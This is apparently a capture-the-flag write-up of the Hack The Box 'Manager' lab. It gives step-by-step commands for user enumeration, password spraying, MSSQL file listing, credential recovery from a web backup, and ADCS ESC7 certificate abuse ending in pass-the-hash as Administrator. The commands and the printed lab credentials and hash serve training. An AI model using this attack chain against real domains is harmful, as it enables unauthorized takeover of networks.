---
title:  "HTB Manager Writeup"
date:   2024-03-16 00:30:00 
categories: HTB Machine
tags: ADCS ESC7 RID_bruteforce MSSQL
---

![Manager](/assets/img/Manager/1697720411681.jpg)

## Introduction 

This machine was a fun active directory based machine, Both the initial access and privilege escalation are common paths. THe privilege escalation was for me really interesting since i haven't encountered ESC7 before during assessments.

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.10.11.236
```
**Nmap**
```
# Nmap 7.94 scan initiated Sun Mar  3 12:05:28 2024 as: nmap -sS -A -p- -o nmap 10.10.11.236
Nmap scan report for manager.htb (10.10.11.236)
Host is up (0.070s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Manager
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-04 00:07:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-03-04T00:09:11+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-03-04T00:09:10+00:00; +7h00m00s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-03T01:39:48
|_Not valid after:  2054-03-03T01:39:48
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.236:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-03-04T00:09:11+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-04T00:09:11+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-03-04T00:09:11+00:00; +7h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49367/tcp open  msrpc         Microsoft Windows RPC
49439/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49730/tcp open  msrpc         Microsoft Windows RPC
61676/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time: 
|   date: 2024-03-04T00:08:31
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   104.39 ms 10.10.16.1
2   104.44 ms manager.htb (10.10.11.236)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar  3 12:09:10 2024 -- 1 IP address (1 host up) scanned in 222.84 seconds
```

When reviewing the Nmap output we can see that this is a domain controller with a webserver and also an additional mssql service open. When checking the webservice it didn't have any interesting information on there. Next i decided to check if i could leak all users using anonymous logon on the domain controller. By running the following netexec command. This gave us a full list of all users present within active directory.

```bash
netexec smb manager.htb -u anonymous -p "" --rid-brute 10000
```

![RID brute force](/assets/img/Manager/Manager_01.png)


Now that we had a a list of users we can try to do some passoword attacks on these. Trying empty password did not work however trying username as password did work. First time i ran this it didn't work because the username was capitalized and the password was not. So some advise when trying username as password always use a capitalized version as well as a non capitalized one. Here we could see that the password of the **Operator** account was **operator** 

```bash
netexec smb manager.htb -u user.txt -p user.txt --no-bruteforce --continue-on-success
```

![Username as pass](/assets/img/Manager/Manager_02.png)

### MSSQL access

So now we had some working credentials of a user account it was time to figure out where we could use them. While going through the services i noticed these credentials gave us access to the **mssql** server. Using the following impacket command we were able to log into the server.

```bash
impacket-mssqlclient manager.htb/operator:operator@manager.htb -windows-auth 
```

![Access to MSSQL](/assets/img/Manager/Manager_03.png)

When did have access to the MSSQL server however we did not have access as sa so we didn't have direct access to running shell commands. We were however able to  use **xp_dirtree**. The xp_ditree command allows the user to list files in the underlying system. While enumerating the system i found out there was a backup file present within the webroot of the webserver

```bash
xp_dirtree c:\InetPub\wwwroot\
```
![Backup file found](/assets/img/Manager/Manager_04.png)

So seeing that this file was present on the webroot we are able to just download it by browsing to the exact filename.

```bash
curl http://manager.htb/website-backup-27-07-23-old.zip -o website-backup-27-07-23-old.zip
```

After extracting the zip file we'd get a full backup of the website. In this backup there was one file named **.old-conf.xml** which contained the credentials of raven

![Credentials of raven](/assets/img/Manager/Manager_05.png)

So now we could use these credentials to gain access to the system using evilwinrm

```bash
evil-winrm  -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

![Initial access as raven](/assets/img/Manager/Manager_06.png)

## Privesc

Looking at the name of the box i was already getting a feeling this might have something to do with certificate abuse. To verify this i ran  certipy to check for any vulnerable ADCS certificates. here we could see that raven had the manageCA permissions which makes it vulnerable to the **ESC7** attacks

```bash
certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -vulnerable
```

```
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```

There are two attacks for this specific vulnerability one requires us to reboot the machine making it not a viable attack for us right now. The technique relies on the fact that users with the Manage CA and Manage Certificates access right can issue failed certificate requests. The SubCA certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the SubCA - which will be denied - but then issued by the manager afterwards.

So first of all we need to enroll make our user raven an officer. This will give us the ability to enable the SubCA template which is vulnerable to ESC1

```bash
certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 
```  
![Raven added as officer ](/assets/img/Manager/Manager_07.png)

next up we need to enable the vulnerable SubCA template. In the screenshot below we can see that we were able to enable this template successfully.

```bash
certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca 'manager-DC01-CA' -enable-template 'SubCA'
```
![SubCa enabled](/assets/img/Manager/Manager_08.png)

Next we try to request a certificate for the administrator user. This will fail but thats the point, using the permissions we have we should be able to pick up on that one again later. Here we can see that our request ID is **16**. Note down this number you'll need it for the next requests

```bash
certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb
```
![Failed certificate](/assets/img/Manager/Manager_09.png)

So now we can issue this certificate again with the following command.
  
```bash
certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca 'manager-DC01-CA' -issue-request 16
```
![Issued certificate](/assets/img/Manager/Manager_10.png)

Now that we have the certificate issued we were able to request this certificate again. This will give us a valid certificate of the administrator user.

```bash
certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca 'manager-DC01-CA' -retrieve 16
```

![Requested certificate](/assets/img/Manager/Manager_11.png)

Then we can try to obtain the ntlm hash of the Administrator user using the following command however the first time i tried this it didn't work. This happens because our machine's time is not in sync with the time of the box we are attacking.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
```
![Failed auth](/assets/img/Manager/Manager_12.png)

This can be easily fixed by synchronizing our clock to the one of the box we are attacking.

```bash
sudo ntpdate -u manager.htb
```
![NTPdate ](/assets/img/Manager/Manager_13.png)

Now we are able to run the same command as before and it will work for us this time. This gives us the NTLM password hash of the administrator user.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
```
![Hash grabbed](/assets/img/Manager/Manager_14.png)

Now we can use pass the hash with evil-winrm to gain access to the domain controller using the administrator user.

```bash
evil-winrm  -i 10.10.11.236 -u Administrator -H 'ae5064c2f62317332c88629e025924ef'
```

![Logged on as Administrator](/assets/img/Manager/Manager_15.png)
